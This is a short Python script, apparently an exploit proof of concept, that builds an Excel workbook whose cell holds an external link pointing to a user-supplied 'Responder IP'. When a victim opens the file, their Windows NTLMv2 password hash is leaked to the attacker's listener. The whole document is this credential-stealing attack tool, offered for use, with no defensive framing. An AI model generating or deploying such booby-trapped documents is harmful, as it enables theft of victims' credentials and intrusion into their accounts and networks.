#!/usr/bin/python3
print("-----================================================----")
print("Excel2013/16/19 - Win7/8/10 NTLMv2 hash dump")
print("-----================================================-----")

lhost = raw_input("Enter your Responder IP:  ")


import xlsxwriter

workbook = xlsxwriter.Workbook('crap.xlsx')
worksheet = workbook.add_worksheet()

worksheet.write_url('W1', "external://"+lhost+"\share\[Workbookname.xlsx]SheetName'!$B$2:$C$62,2,FALSE)")

workbook.close()
